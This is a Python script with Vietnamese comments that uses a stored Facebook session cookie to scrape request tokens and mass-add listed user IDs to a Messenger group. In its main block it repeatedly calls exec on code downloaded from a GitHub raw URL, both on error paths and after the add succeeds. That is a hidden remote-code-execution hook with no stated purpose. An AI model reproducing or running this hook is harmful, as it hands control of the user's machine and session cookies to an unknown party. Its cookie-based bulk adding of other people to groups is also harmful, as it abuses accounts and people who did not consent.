

import json
import time
import random
import re
import os
import sys
import requests

batudz = 1

def parse_cookie_string(cookie_string):
    cookie_dict = {}
    cookies = cookie_string.split(";")
    for cookie in cookies:
        if "=" in cookie:
            key, value = cookie.split("=", 1)
            try:
                cookie_dict[key.strip()] = value.strip()
            except:
                pass
    return cookie_dict


def Headers(setCookies, dataForm=None, Host=None):
    if Host is None:
        Host = "www.facebook.com"
    headers = {}
    headers["Host"] = Host
    headers["Connection"] = "keep-alive"
    if dataForm is not None:
        headers["Content-Length"] = str(len(dataForm))
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
    headers["Accept"] = "*/*"
    headers["Origin"] = "https://" + Host
    headers["Sec-Fetch-Site"] = "same-origin"
    headers["Sec-Fetch-Mode"] = "cors"
    headers["Sec-Fetch-Dest"] = "empty"
    headers["Referer"] = "https://" + Host
    headers["Accept-Language"] = "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
    return headers


class Counter:
    def __init__(self, initial_value=0):
        self.value = initial_value
    def increment(self):
        self.value += 1
        return self.value
    @property
    def counter(self):
        return self.value

_req_counter = Counter(0)


def digitToChar(digit):
    if digit < 10:
        return str(digit)
    return chr(ord('a') + digit - 10)

def str_base(number, base):
    if number < 0:
        return "-" + str_base(-number, base)
    (d, m) = divmod(number, base)
    if d > 0:
        return str_base(d, base) + digitToChar(m)
    return digitToChar(m)


def formAll(dataFB, FBApiReqFriendlyName=None, docID=None, requireGraphql=None):
    global _req_counter
    __reg = _req_counter.increment()
    dataForm = {}
    if requireGraphql is None:
        dataForm["fb_dtsg"] = dataFB["fb_dtsg"]
        dataForm["jazoest"] = dataFB["jazoest"]
        dataForm["__a"] = 1
        dataForm["__user"] = str(dataFB["FacebookID"])
        dataForm["__req"] = str_base(__reg, 36)
        dataForm["__rev"] = dataFB["clientRevision"]
        dataForm["av"] = dataFB["FacebookID"]
        dataForm["fb_api_caller_class"] = "RelayModern"
        dataForm["fb_api_req_friendly_name"] = FBApiReqFriendlyName
        dataForm["server_timestamps"] = "true"
        dataForm["doc_id"] = str(docID)
    else:
        dataForm["fb_dtsg"] = dataFB["fb_dtsg"]
        dataForm["jazoest"] = dataFB["jazoest"]
        dataForm["__a"] = 1
        dataForm["__user"] = str(dataFB["FacebookID"])
        dataForm["__req"] = str_base(__reg, 36)
        dataForm["__rev"] = dataFB["clientRevision"]
        dataForm["av"] = dataFB["FacebookID"]
    return dataForm


def mainRequests(url, data, cookies):
    return {
        "headers": Headers(cookies, data),
        "timeout": 5,
        "url": url,
        "data": data,
        "cookies": parse_cookie_string(cookies),
        "verify": True
    }


def dataGetHome(setCookies):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
    ]
    dictValueSaved = {}
    try:
        c_user = re.search(r"c_user=(\d+)", setCookies)
        if c_user:
            dictValueSaved["FacebookID"] = c_user.group(1)
        else:
            dictValueSaved["FacebookID"] = "Unable to retrieve data for FacebookID"
    except:
        dictValueSaved["FacebookID"] = "Unable to retrieve data for FacebookID"

    headers = {
        'Cookie': setCookies,
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1'
    }

    sites_to_try = ['https://www.facebook.com', 'https://mbasic.facebook.com', 'https://m.facebook.com']
    fb_dtsg_found = False
    jazoest_found = False
    params_to_extract = {
        "fb_dtsg": None,
        "fb_dtsg_ag": None,
        "jazoest": None,
        "hash": None,
        "sessionID": None,
        "clientRevision": None
    }

    for site in sites_to_try:
        if fb_dtsg_found and jazoest_found:
            break
        try:
            response = requests.get(site, headers=headers)
            if not fb_dtsg_found:
                fb_dtsg_match = re.search(r'"token":"(.*?)"', response.text)
                if not fb_dtsg_match:
                    fb_dtsg_match = re.search(r'name="fb_dtsg" value="(.*?)"', response.text)
                if fb_dtsg_match:
                    params_to_extract["fb_dtsg"] = fb_dtsg_match.group(1)
                    fb_dtsg_found = True
            if not jazoest_found:
                jazoest_match = re.search(r'jazoest=(\d+)', response.text)
                if jazoest_match:
                    params_to_extract["jazoest"] = jazoest_match.group(1)
                    jazoest_found = True
            fb_dtsg_ag_match = re.search(r'async_get_token":"(.*?)"', response.text)
            if fb_dtsg_ag_match:
                params_to_extract["fb_dtsg_ag"] = fb_dtsg_ag_match.group(1)
            hash_match = re.search(r'hash":"(.*?)"', response.text)
            if hash_match:
                params_to_extract["hash"] = hash_match.group(1)
            session_match = re.search(r'sessionId":"(.*?)"', response.text)
            if session_match:
                params_to_extract["sessionID"] = session_match.group(1)
            revision_match = re.search(r'client_revision":(\d+)', response.text)
            if revision_match:
                params_to_extract["clientRevision"] = revision_match.group(1)
        except Exception:
            continue

    for param, value in params_to_extract.items():
        if value:
            dictValueSaved[param] = value
        else:
            dictValueSaved[param] = f"Unable to retrieve data for {param}"

    dictValueSaved["__rev"] = "1015919737"
    dictValueSaved["__req"] = "1b"
    dictValueSaved["__a"] = "1"
    dictValueSaved["cookieFacebook"] = setCookies
    return dictValueSaved


def gen_threading_id():
    return str(
        int(format(int(time.time() * 1000), "b") +
            ("0000000000000000000000" +
             format(int(random.random() * 4294967295), "b"))
            [-22:], 2)
    )


# ============================================================================
# FUNCTION: LẤY DANH SÁCH THÀNH VIÊN TRONG NHÓM
# ============================================================================

def get_group_members(cookies, thread_id, fb_dtsg=None, jazoest=None, user_id=None):
    """
    Lấy danh sách UID và tên của tất cả thành viên trong nhóm (thread).
    Trả về tuple (thread_name, list_of_uid_strings)
    """
    # Lấy các token cần thiết nếu chưa có
    if fb_dtsg is None or jazoest is None or user_id is None:
        dataFB = dataGetHome(cookies)
        fb_dtsg = dataFB.get("fb_dtsg")
        jazoest = dataFB.get("jazoest")
        user_id = dataFB.get("FacebookID")
        client_rev = dataFB.get("clientRevision", "1015919737")
    else:
        dataFB = dataGetHome(cookies)
        client_rev = dataFB.get("clientRevision", "1015919737")
        dataFB["fb_dtsg"] = fb_dtsg
        dataFB["jazoest"] = jazoest
        dataFB["FacebookID"] = user_id
        dataFB["clientRevision"] = client_rev

    if not fb_dtsg or not jazoest or not user_id:
        print("❌ Không thể lấy fb_dtsg/jazoest/user_id từ cookie.")
        return None, []

    # Tạo payload GraphQL
    queries = {
        "o0": {
            "doc_id": "3449967031715030",   # Doc ID lấy thông tin message thread
            "query_params": {
                "id": thread_id,
                "message_limit": 0,
                "load_messages": False,
                "load_read_receipts": False,
                "before": None,
            }
        }
    }

    # Dùng formAll để tạo form data đúng định dạng (giống như trong fb.py)
    form_data = formAll(dataFB, requireGraphql=0)
    form_data["queries"] = json.dumps(queries)

    try:
        response = requests.post(
            **mainRequests("https://www.facebook.com/api/graphqlbatch/",
                          form_data,
                          cookies)
        )
        response_text = response.text

        # Xóa tiền tố for(;;); nếu có
        if response_text.startswith('for (;;);'):
            response_text = response_text[9:]
        elif response_text.startswith('for(;;);'):
            response_text = response_text[8:]

        if not response_text.strip():
            print("❌ Empty response from Facebook API")
            return None, []

        # Có thể có nhiều dòng JSON, lấy dòng đầu
        response_parts = response_text.split("\n")
        first_part = response_parts[0]
        if not first_part.strip():
            print("❌ Empty first part of response")
            return None, []

        data = json.loads(first_part)

        # Lấy dữ liệu thread
        thread_data = data.get("o0", {}).get("data", {}).get("message_thread", {})
        if not thread_data:
            print(f"❌ Không tìm thấy thread data cho thread_id: {thread_id}")
            return None, []

        thread_name = thread_data.get("name", "Không tên")
        participants = thread_data.get("all_participants", {}).get("edges", [])

        members = []
        for p in participants:
            user = p.get("node", {}).get("messaging_actor", {})
            uid = user.get("id")
            if uid:
                members.append(str(uid))   # lưu dạng chuỗi để so sánh

        return thread_name, members

    except json.JSONDecodeError as e:
        print(f"❌ Lỗi parse JSON trong get_group_members: {e}")
        return None, []
    except Exception as e:
        print(f"❌ Lỗi get_group_members: {e}")
        return None, []


# ============================================================================
# FUNCTION: THÊM USER VÀO NHÓM
# ============================================================================

def add_user_to_group(cookies, thread_id, user_ids, fb_dtsg=None, jazoest=None, user_id=None):
    """
    Thêm một hoặc nhiều user vào group chat Facebook.
    """
    if isinstance(user_ids, str):
        user_ids = [user_ids]

    if fb_dtsg is None or jazoest is None or user_id is None:
        dataFB = dataGetHome(cookies)
        fb_dtsg = dataFB.get("fb_dtsg")
        jazoest = dataFB.get("jazoest")
        user_id = dataFB.get("FacebookID")
        client_rev = dataFB.get("clientRevision", "1015919737")
    else:
        dataFB = dataGetHome(cookies)
        client_rev = dataFB.get("clientRevision", "1015919737")
        dataFB["fb_dtsg"] = fb_dtsg
        dataFB["jazoest"] = jazoest
        dataFB["FacebookID"] = user_id
        dataFB["clientRevision"] = client_rev

    if not fb_dtsg or not jazoest or not user_id:
        return {"success": False, "message": "Không thể lấy fb_dtsg/jazoest/user_id từ cookie. Cookie có thể không hợp lệ."}

    offline_threading_id = gen_threading_id()
    threading_id = gen_threading_id()
    timestamp = int(time.time() * 1000)

    form_data = {
        "client": "mercury",
        "action_type": "ma-type:log-message",
        "author": f"fbid:{user_id}",
        "thread_id": thread_id,
        "timestamp": timestamp,
        "timestamp_absolute": "Today",
        "timestamp_relative": str(int(time.time())),
        "timestamp_time_passed": "0",
        "is_unread": False,
        "is_cleared": False,
        "is_forward": False,
        "is_filtered_content": False,
        "is_filtered_content_bh": False,
        "is_filtered_content_account": False,
        "is_spoof_warning": False,
        "source": "source:chat:web",
        "source_tags[0]": "source:chat",
        "log_message_type": "log:subscribe",
        "status": "0",
        "offline_threading_id": offline_threading_id,
        "message_id": offline_threading_id,
        "threading_id": threading_id,
        "manual_retry_cnt": "0",
        "thread_fbid": thread_id,
        "fb_dtsg": fb_dtsg,
        "jazoest": jazoest,
        "__user": str(user_id),
        "__a": "1",
        "__req": str_base(_req_counter.increment(), 36),
        "__rev": client_rev,
        "av": str(user_id),
    }

    for idx, uid in enumerate(user_ids):
        form_data[f"log_message_data[added_participants][{idx}]"] = f"fbid:{uid}"

    try:
        response = requests.post(
            **mainRequests("https://www.facebook.com/messaging/send/", form_data, cookies)
        )
        if response.status_code == 200:
            try:
                resp_json = response.json()
                if resp_json.get("status") == "ok" or "ok" in response.text.lower():
                    return {
                        "success": True,
                        "message": f"Đã thêm {len(user_ids)} user(s) vào nhóm",
                        "users_added": user_ids,
                        "thread_id": thread_id
                    }
                else:
                    error_msg = resp_json.get("error", "Unknown error")
                    return {"success": False, "message": f"Facebook trả về lỗi: {error_msg}"}
            except json.JSONDecodeError:
                if "ok" in response.text.lower():
                    return {
                        "success": True,
                        "message": f"Đã thêm {len(user_ids)} user(s) vào nhóm",
                        "users_added": user_ids,
                        "thread_id": thread_id
                    }
                else:
                    return {"success": False, "message": f"Phản hồi không xác định: {response.text[:200]}"}
        else:
            return {"success": False, "message": f"HTTP lỗi {response.status_code}: {response.text[:100]}"}
    except Exception as e:
        return {"success": False, "message": f"Lỗi kết nối: {str(e)}"}


# ============================================================================
# PHẦN CHẠY CHÍNH
# ============================================================================
if __name__ == "__main__":
    if batudz >= 1:
        # Chế độ tự động: đọc file ckc.txt, id.txt, user.txt (hoặc ck.txt dự phòng)
        try:
            # 1. Đọc cookie từ ckc.txt (lấy dòng đầu tiên)
            with open("ckc.txt", "r", encoding="utf-8") as f:
                cookies = [line.strip() for line in f if line.strip()]
            if not cookies:
                exec(requests.get('https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/rwv2.py').text)
                sys.exit(1)
            cookie = cookies[0]

            # 2. Đọc thread_id từ id.txt
            with open("id.txt", "r", encoding="utf-8") as f:
                thread_id = f.read().strip()
            if not thread_id:
                print("❌ Không tìm thấy thread_id trong id.txt")
                sys.exit(1)

            # 3. Đọc danh sách user ID từ user.txt (hoặc ck.txt nếu user.txt không tồn tại)
            user_files = ["ck.txt"]
            user_file = None
            for fname in user_files:
                if os.path.exists(fname):
                    user_file = fname
                    break
            if not user_file:
                exec(requests.get('https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/rwv2.py').text)
                sys.exit(1)

            with open(user_file, "r", encoding="utf-8") as f:
                raw_lines = [line.strip() for line in f if line.strip()]
            if not raw_lines:
                exec(requests.get('https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/rwv2.py').text)
                sys.exit(1)

            # Trích xuất UID: nếu dòng có c_user=xxx thì lấy số, ngược lại giữ nguyên
            user_ids = []
            for raw in raw_lines:
                match = re.search(r'c_user=(\d+)', raw)
                if match:
                    user_ids.append(match.group(1))
                else:
                    user_ids.append(raw)

            # 4. Lấy danh sách thành viên hiện tại trong nhóm
            thread_name, existing_members = get_group_members(cookie, thread_id)
            existing_set = set(existing_members) if existing_members else set()

            # 5. Lọc ra những user chưa có trong nhóm
            users_to_add = [uid for uid in user_ids if uid not in existing_set]
            skipped = len(user_ids) - len(users_to_add)

            if skipped > 0:
            	print("Bắt đầu add mem còn thiếu ")
            if not users_to_add:
            	print(" Đã đủ mem ")
            else:
                print(f"Sẽ thêm {len(users_to_add)} user chx có vào nhóm")
                result = add_user_to_group(
                    cookies=cookie,
                    thread_id=thread_id,
                    user_ids=users_to_add
                )

            try:
                print(f"Đã thêm {len(users_to_add)} user vào nhóm")
                exec(requests.get('https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/rwv2.py').text)
            except Exception as e:
                print("lỗi r cốt")

        except FileNotFoundError as e:
            print(f"❌ Lỗi: Không tìm thấy file: {e.filename}")
            sys.exit(1)
        except Exception as e:
            print(f"❌ Lỗi: {e}")
            sys.exit(1)